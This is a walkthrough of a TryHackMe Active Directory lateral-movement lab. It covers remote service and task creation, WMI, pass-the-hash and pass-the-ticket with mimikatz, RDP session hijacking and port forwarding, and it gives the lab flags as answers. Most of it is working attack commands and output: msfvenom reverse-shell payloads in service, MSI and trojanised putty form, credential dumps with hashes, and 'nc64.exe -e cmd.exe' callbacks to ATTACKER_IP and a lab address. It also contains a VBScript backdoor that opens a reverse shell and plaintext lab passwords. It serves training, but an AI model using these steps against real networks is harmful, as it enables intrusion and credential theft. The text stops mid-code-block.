Task1 - Introduction
---------------------------------------------

Setup DNS  and download Creds:
Username: tracey.turner Password: Letters1974

Task2 - Moving Through the Network
--------------------------------------------------------

This task discusses moving laterally through network using ssh/rdp etc to get to other hosts. This can provide some benefits such as alternate approach to attack, avoiding detection etc. 

Care must be taken though, it might not make sense for a dev user to be connecting to a finance PC or vice-versa.

UAC is imposed on local admins but not default administrator. Local admins cannot remotely connect to other machines for administrative tasks except an interactive session through rdp.


Task3 - Spawning Processes Remotely
-----------------------------------------------------------

In this task we will look at running processes remotely.

Psexec
* Port 445/tcp (SMB)
* Requires Group Membership in Administrators

The way it works:
1.  Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
2.  Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.
3.  Create some named pipes to handle stdin/stdout/stderr.

Format is:
```shell-session
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

We can do the same thing in Powershell but first we need a PSCredential object:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Then use this method to connect:
```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet which run scripts remote via WinRM. Be sure you have your PSCredential object setup 1st:

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

You can remotely create services with `sc`

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCE/RPC)
    -   445/TCP (RPC over SMB Named Pipes)
    -   139/TCP (RPC over SMB Named Pipes)
-   **Required Group Memberships:** Administrators

1. A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.

2. If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).

Usage:
```shell-session
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

```shell-session
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

Another thing we can do is schedule tasks remotely:

Startup:
```shell-session
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```

And stop/cleanup:
```shell-session
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

Ok let's SSH in using the credentials we got:

```
**User:** ZA.TRYHACKME.COM\t1_leonard.summers
**Password:** EZpass4ever
```

```shell-session
root@ip-10-10-63-136:~# ssh za\\leonard.summers@thmjmp2.za.tryhackme.com
The authenticity of host 'thmjmp2.za.tryhackme.com (10.200.64.249)' can't be established.
ECDSA key fingerprint is SHA256:mKpbr9DhO6i956GwbTAxqxfZnag5vDfb3u9I7LeD//o.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'thmjmp2.za.tryhackme.com,10.200.64.249' (ECDSA) to the list of known hosts.
za\leonard.summers@thmjmp2.za.tryhackme.com's password: 

Microsoft Windows [Version 10.0.14393]                                          
(c) 2016 Microsoft Corporation. All rights reserved.                            

za\leonard.summers@THMJMP2 C:\Users\leonard.summers>
```



Note that it is possible to spawn a reverse shell using these methods but the service executable will kill them almost immediately. To get around this we can use msfvenom and encap them in a fully functional service executable.

First we make an exe-service encapsulated reverse shell:
```bash
root@ip-10-10-63-136:~# msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.61.196 LPORT=4444 -o dabomb.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe-service file: 15872 bytes
Saved as: dabomb.exe
```

Now we place it on the server

```bash
C:\Windows\system32>hostname
hostname
THMJMP2

C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create THMservice-4001 binPath= "%windir%\dabomb.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com create THMservice-4001 binPath= "%windir%\dabomb.exe" start= auto
[SC] CreateService SUCCESS

```

Setup msfconsole to wait for our reverse shell once we spawn it with the service we will be putting on the iis server.

```bash
root@ip-10-10-63-136:~# msfconsole
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use help <command> to learn more about any command

msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set LHOST lateralmovement
LHOST => lateralmovement
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.50.61.196:4444 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.200.64.201
[*] Command shell session 1 opened (10.50.61.196:4444 -> 10.200.64.201:62792) at 2022-11-09 05:04:42 +0000
```

You can also do a 1-liner:
```shell-session
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
```


NOTE: we cannot use sc.exe to specifiy credentials we need to now spawn a new shell. we can use runas to spawn a new shell with t1_leonard.summers access token.

```shell-session
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start THMservice-4001 
sc.exe \\thmiis.za.tryhackme.com start THMservice-4001 

SERVICE_NAME: THMservice-4001 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4468
        FLAGS              : 
```

Catch the reverse shell we setup the listener with metaploit on 4444 earlier and then go to desktop of t1_leonard.summers to get the flag:

```shell-session
c:\Users\t1_leonard.summers\Desktop>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of c:\Users\t1_leonard.summers\Desktop

2022/06/17  17:41    <DIR>          .
2022/06/17  17:41    <DIR>          ..
2022/06/17  17:40            58\ufffd368 Flag.exe
               1 File(s)         58\ufffd368 bytes
               2 Dir(s)  46\ufffd532\ufffd075\ufffd520 bytes free

c:\Users\t1_leonard.summers\Desktop>Flag.exe
Flag.exe
THM{MOVING_WITH_SERVICES}
```

__Questions__

What is the user flag on t1_leonard.summers Desktop:
Answer: _THM{MOVING_WITH_SERVICES}_



Task4 - Moving Laterally Using WMI
---------------------------------------------------------

We can also do some techniques using Windows Management Instrumentation (WMI). This is the Windows version of Web-Based Enterprise Management (WBEM).

This tool allows admins to perform standard management tasks.

As before we need a PSCredential object in order to connect to WMI with powershell.

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

-   **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
-   **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

Use this to connect:
```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

## Remote Process Creation Using WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
        
-   **Required Group Memberships:** Administrators
- 
```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Process is created silently without feedback.

For legacy systems:
```shell-session
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```

## Creating Services Remotely with WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-   **Required Group Memberships:** Administrators

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

Start service:
```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Stop Service:
```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

## Creating Scheduled Tasks Remotely with WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-   **Required Group Memberships:** Administrators

Create Scheduled Task:
```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

Delete Scheduled Task:
```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

## Installing MSI packages through WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-   **Required Group Memberships:** Administrators

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

And for legacy systems:
```shell-session
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

## Let's go to town!

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

For this exercise, we will assume we have already captured some credentials with administrative access:

**User:** ZA.TRYHACKME.COM\t1_corine.waters
**Password:** Korine.1994

Generate a payload for msi type:
```bash
root@ip-10-10-63-136:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > dabomb.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
```

Upload it:
```bash
root@ip-10-10-63-136:~# smbclient -c 'put dabomb.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$' Korine.1994
WARNING: The "syslog" option is deprecated
putting file dabomb.msi as \dabomb.msi (1714.3 kb/s) (average 1714.3 kb/s)
```

Since we saved our payload to the ADMIN$ share it will be avail on C:\Windows\

Lets start a hander with metaploit:

```bash
Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services

msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set LHOST lateralmovement
LHOST => lateralmovement
msf5 exploit(multi/handler) > set LPORT 4445
LPORT => 4445
msf5 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.50.61.196:4445 
```

```shell-session
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

Now we invoke it to start the msi install and start service for reverse shell:
```shell-session
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\dabomb.msi"; Options = ""; AllUsers = $false}
```

Now we catch our reverse shell in Meterpreter:
```bash
[*] Command shell session 1 opened (10.50.61.196:4445 -> 10.200.64.201:63626) at 2022-11-09 06:54:20 +0000



C:\Windows\system32>hostname
hostname
THMIIS
```

Now just go to Corines Desktop to get the flag:
```shell-session
C:\Windows\system32>cd C:\Users\t1_corine.waters\Desktop
cd C:\Users\t1_corine.waters\Desktop

C:\Users\t1_corine.waters\Desktop>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Users\t1_corine.waters\Desktop

2022/06/17  17:52    <DIR>          .
2022/06/17  17:52    <DIR>          ..
2022/06/17  17:52            58\ufffd368 Flag.exe
               1 File(s)         58\ufffd368 bytes
               2 Dir(s)  46\ufffd530\ufffd170\ufffd880 bytes free

C:\Users\t1_corine.waters\Desktop>Flag.exe
Flag.exe
THM{MOVING_WITH_WMI_4_FUN}


C:\Users\t1_corine.waters\Desktop>
```

__Questions__

What is the flag on t1_corine.waters Desktop?
Answer: _THM{MOVING_WITH_WMI_4_FUN}_


Task5 - Use of Alternate Authentication Material
-----------------------------------------------------------------

In this task we will work with using methods to login when we don't know a user's password. Tools like Mimikatz can help us extract credentials.

This works when either NTLM or Kerberos Authentication is available on the network.

## NTLM

For NTLM the process is the following:
1.  The client sends an authentication request to the server they want to access.
2.  The server generates a random number and sends it as a challenge to the client.
3.  The client combines his NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.
4.  The server forwards both the challenge and the response to the Domain Controller for verification.
5.  The domain controller uses the challenge to recalculate the response and compares it to the initial response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.
6.  The server forwards the authentication result to the client.

This process is done only locally if we aren't on a domain.

## Pass-the-Hash

We don't need to know a user's password. If we get access to the user hash either through mimikatz or accessing the SAM or by extracting hashes directly from LSASS memory we can use a technique called Pass-the-Hash (PtH) to gain access.

__Extracting NTLM Hashes from local SAM__
```shell-session
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

__Extracting NTLM Hashes from LSASS memory__

```shell-session
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```

By whatever means we do get the hash, we can use Mimikatz to inject an access token for the victim on a reverse shell or other like this:
```shell-session
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

We would have to have a listener running on our box:
```shell-session
user@AttackBox$ nc -lnvp 5555
```

NOTE: If you use whoami to show what user you are after the attack it will still show the original user, however the commands run will happen as the users credentials that were injected.

Here are some ways to use Pass-the-Hash:
```shell-session
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

```shell-session
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

NOTE: only can be used on Linux version.

```shell-session
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

## Kerberos Authentication

Here is how Kerberos works:

1. The user sends username and timestamp encypted key to the Key Distribution Center on the domain controller.
2. The KDC will send back a Ticket Granting Ticket (TGT) which allows a user to request tickets to other services without sending credentials. Also a Session Key is sent that is used to generate subsequent requests.
3. Next the user asks the KDC for Ticket Granting Service (TGS). For access to the service, we send a new request with username and timestamp encrypted with the Session Key as well as the TGT and a Service Principal Name (SPN), which is the service we want to access.
4. The KDC then sends us a TGS and Service Session Key. This is then used to authenticate against the service. The TGS is encrypted with Service Owner Hash.

We CAN extract service tickets and keys from LSASS memory with Mimikatz, but we generally need SYSTEM privs to do it.

We can do it like this:
```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

NOTE: We need both the ticket and session key.

TGT is good because if we had Administrator rights we can request access to other services the user might have access to. TGS can be requested from lower level accounts but ones only for that account.

Here is how to use Mimikatz to inject those:
```shell-session
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

To check if the tickets were correctly injected we can use the klist command:
```shell-session
za\bob.jenkins@THMJMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```

### Overpass-the-Hash / Pass-the-Key

We can do the same type of Attack with Kerberos networks:

To get keys:
```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

If we have an RC4 hash, we can  get a reverse shell providing netcat is available:
```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

With AES128:
```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

With AES256:
```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

NOTE: When using RC4 the key is same as the NTLM hash of a user. This means we can request TGT if RC4 is enabled. This variant is called Overpass-the-Hash (OPtH)

Be sure you have a listener running to catch the reverse shell.

## Let's go to town! 

To begin this exercise, you will need to connect to THMJMP2 using the following credentials via SSH:

User: ZA.TRYHACKME.COM\t2_felicia.dean

Password: iLov3THM!

`ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com`


For this task we will ssh into the jump box using our captured credentials for felicia. Then use mimikatz to extract auth material to do PtH, PtT, or PtK against t1_toby.beck.

After getting a command prompt we can use winrs without needing credentials since they are already available in our current session.

```shell-session
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

Login the jumphost. Fix the DNS resolver:
```bash
root@ip-10-10-90-19:~# systemd-resolve --interface lateralmovement --set-dns 10.200.64.101 --set-domain za.tryhackme.com
root@ip-10-10-90-19:~# nslookup thmdc.za.tryhackme.com
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	thmdc.za.tryhackme.com
Address: 10.200.64.101
```

Login with Felicia to the jmp2 host:
```bash
ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
(password)

Microsoft Windows [Version 10.0.14393]                                          
(c) 2016 Microsoft Corporation. All rights reserved.                            

za\t2_felicia.dean@THMJMP2 C:\Users\t2_felicia.dean>                            
```

Now we need to use mimikatz to extract authentication material for the user t1_toby.beck.

First  let's check what we have:
```shell-session
za\t2_felicia.dean@THMJMP2 C:\tools>mimikatz                                    

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53                    
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                     
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )        
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                         
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )       
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/       

mimikatz # privilege::debug                                                     
Privilege '20' OK                                                               

mimikatz # token::elevate                                                       
Token Id  : 0                                                                   
User name :                                                                     
SID name  : NT AUTHORITY\SYSTEM                                                 

508     {0;000003e7} 1 D 16819          NT AUTHORITY\SYSTEM     S-1-5-18        
(04g,21p)       Primary                                                         
 -> Impersonated !                                                              
 * Process Token : {0;00095b70} 0 D 717907      ZA\t2_felicia.dean      S-1-5-21
-3330634377-1326264276-632209373-4605   (12g,24p)       Primary                 
 * Thread Token  : {0;000003e7} 1 D 1138980     NT AUTHORITY\SYSTEM     S-1-5-18
        (04g,21p)       Impersonation (Delegation)                                                                          

mimikatz # lsadump::sam                                                         
Domain : THMJMP2                                                                
SysKey : 2e27b23479e1fb1161a839f9800119eb                                       
Local SID : S-1-5-21-1946626518-647761240-1897539217                            

SAMKey : 9a74a253f756d6b012b7ee3d0436f77a                                       

RID  : 000001f4 (500)                                                           
User : Administrator                                                            
  Hash NTLM: 0b2571be7e75e3dbd169ca5352a2dad7                                   

RID  : 000001f5 (501)                                                           
User : Guest                                                                    

RID  : 000001f7 (503)                                                           
User : DefaultAccount                                                           

mimikatz #                                                                      
```

Let's check for tokens now:
```shell-session
mimikatz # token::revert
mimikatz # sekurlsa::msv                                                        

Authentication Id : 0 ; 926676 (00000000:000e23d4)                              
Session           : RemoteInteractive from 7                                    
User Name         : t1_toby.beck3                                               
Domain            : ZA                                                          
Logon Server      : THMDC                                                       
Logon Time        : 11/10/2022 3:15:29 AM                                       
SID               : S-1-5-21-3330634377-1326264276-632209373-4618               
        msv :                                                                   
         [00000003] Primary                                                     
         * Username : t1_toby.beck3                                             
         * Domain   : ZA                                                        
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                          
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                  
         * DPAPI    : 20fa99221aff152851ce37bcd510e61e                          

[..] cut to save space [..]

mimikatz #      
```

Ok great, we found tokens for our target user. We will just copy the NTLM one. 

Let's go ahead and setup a listener on the attackbox so that when we start our reverse shell we can catch it:

```bash
root@ip-10-10-90-19:~# nc -lnvp 5454
Listening on [0.0.0.0] (family 0, port 5454)
```

Now back in the Windows shell:
```shell-session
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.61.196 5454"
```

Now we get our reverse shell:
```shell-session
Listening on [0.0.0.0] (family 0, port 5454)
Connection from 10.200.64.249 51684 received!
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Now we need to run winrs to login as toby to the iis server:
```shell-session
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\t1_toby.beck>cd Desktop
cd Desktop
```

Now from his desktop we should be able to get the flag:
```shell-session
C:\Users\t1_toby.beck\Desktop>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Users\t1_toby.beck\Desktop

06/17/2022  07:01 PM    <DIR>          .
06/17/2022  07:01 PM    <DIR>          ..
06/15/2022  10:29 PM            58,368 Flag.exe
               1 File(s)         58,368 bytes
               2 Dir(s)  46,560,337,920 bytes free

C:\Users\t1_toby.beck\Desktop>flag.exe
flag.exe
THM{NO_PASSWORD_NEEDED}


C:\Users\t1_toby.beck\Desktop>

```

Here is how we can do that pass-the-hash from kali:
```bash
impacket-wmiexec -hashes ':533f1bd576caa912bdb9da284bbc60fe' 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com'
```

Example of Pass-the-key from Kali:
```shell
# Request a TGT using the AES-256 hash
impacket-getTGT 'za.tryhackme.com/t1_toby.beck' -aesKey 6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e

# Create an environment variable for Impacket
export KRB5CCNAME=t1_toby.beck.ccache

# Get a shell
impacket-wmiexec 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com' -k -no-pass
```

Copy

__Question__
What is the flag obtained from executing "flag.exe" on t1_toby.beck's desktop on THMIIS?
Answer: _THM{NO_PASSWORD_NEEDED}_


Task6 - Abusing User Behavior
--------------------------------------

Another thing we can do is take advantage of common things users do.

__Backdoors__

For example modifying a shortcut to an executable on a network share.

For example if the shared resource is a .vbs script we could copy nc64 to the same share and inject this code into the script:
```shell-session
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

This would copy the nc64 over to the user's `%tmp%` directory and send a reverse shell to the attacker if someone opens the vbscript.

We can similarly do this for .exe files. If the shared file was putty.exe, we could download it and inject it using msfvenom to add the reverse payload and put it back. It would work normally but also give us the reserve shell:

```shell-session
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

This is a meterpreter payload so we could simply use the exploit/multi/handler of metasploit to wait for a connection.

__RDP Hijacking__

If users commonly use RDP to connect to a server, and just close the window instead of logging off, we can take over their session.

With SYSTEM privs on Window Server 2016 and earlier, you can do this attack without even using a password!

If we have admin level access we can get SYSTEM by many methods. 

Example:
Run cmd.exe as administrator
Run `PsExe64.exe -s cmd.exe`

To list existing sessions
```shell-session
C:\> query user 
USERNAME       SESSIONNAME ID STATE IDLE TIME LOGON TIME >administrator rdp-tcp#6    2 Active . 4/1/2022 4:09 AM
luke                        3 Disc   . 4/6/2022 6:51 AM

```

Any session that is left open in Disc state we can take over.  They might notice later tho that they were knocked off.

If we were connected as admin (as above) we could use this command to get Luke's session:
```shell-session
tscon 3 /dest:rdp-tcp#6
```

NOTE: As of Windows Server 2019 you won't be able to do this unless you know the password.

## Let's go to town!

Need to get new creds from:
http://distributor.za.tryhackme.com/creds_t2
Username: t2_abigail.cox Password: Vivian2008

After that we can run:
`xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_abigail.cox /p:Vivian2008

Click start and type cmd, and then right click it and open as administrator.

Then
`cd C:\tools`

Run: 
`PsExe64.exe -s cmd.exe`

Then Query the User:
```shell-session
C:\> query user 
USERNAME       SESSIONNAME ID STATE IDLE TIME LOGON TIME >administrator rdp-tcp#5    3 Active . 4/1/2022 4:09 AM
amy                        2 Disc   . 4/6/2022 6:51 AM
```

Then grab the sesion:
```shell-session
tscon 2 /dest:rdp-tcp#5
```

We get MS Paint opened on the sceen with a Text and answer to the
__Question__
What flag did you get from hijacking t1_toby.beck's session on THMJMP2?
Answer: _THM{NICE_WALLPAPER}_


Task7 - Port Forwarding
-------------------------------

Sometime lateral movement isn't so easy because admins have disabled normal port for security reasons preventing you from reaching RDP, SMB, WinRM, RPC ports.

We can simply go around these restrictions by using some port forwarding techniques which consists of using a compromised host as a jump box to pivot to other hosts.

## SSH Tunnelling

SSH already has built in methods for port forwarding. This has been traditionally for Linux only but recently Windows also ships with OpenSSH client by default.

The Idea is we get access to PC-1 and use it as a pivot to access some port inside the network. We can use it's SSH-client to connect back to our attackbox which is running an SSH server.  

We'll need to create a user on our box for it to use.

```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

We can use the tunnel for either local or remote port forwarding.

__SSH Remote Port Forwarding__

Let's assume our Attackbox cannot access port 3389 on the Server. But the box PC-1 we compromised can.

We can use SSH remote port forwarding to forward 3389 from PC-1 back to our attackbox.

Now from PC-1 we could execute:
```shell-session
C:\> ssh tunneluser@[attackbox_ip] -R 3389:[server_ip]:3389 -N
```

The reason for the -N switch is to prevent the client from requesting a shell on the Attacker PC, else the connection would close immediately.

Now from the Attackbox we can run:
```shell-session
munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```

__SSH Local Port Forwarding__

This allows us to PULL a port from an SSH server to the SSH client.

To forward port 80 from our Attackbox and make it available from PC-1 run this on PC-1 or our compromised pivotbox:

```shell-session
C:\> ssh tunneluser@[attackbox_ip] -L *:80:127.0.0.1:80 -N
```

Please note we may need to open a firewall port for this if we have Admin privs:
```shell-session
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

Now any PC inside the network using their browser to go to http://[PC-1_ip:80] would see our website published from the Attackbox.

__Port Forwarding With Socat__

Typically socat is not installed by default so whatever we do we would almost certainly need to transfer it to our PC-1 pivot box first.

If we want to open port 1234 and forward that to our attackbox  on port 4321:
```shell-session
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
```

To access port 3389 on the server using PC-1/pivot we could do the following from the PC-1/pivot:
```shell-session
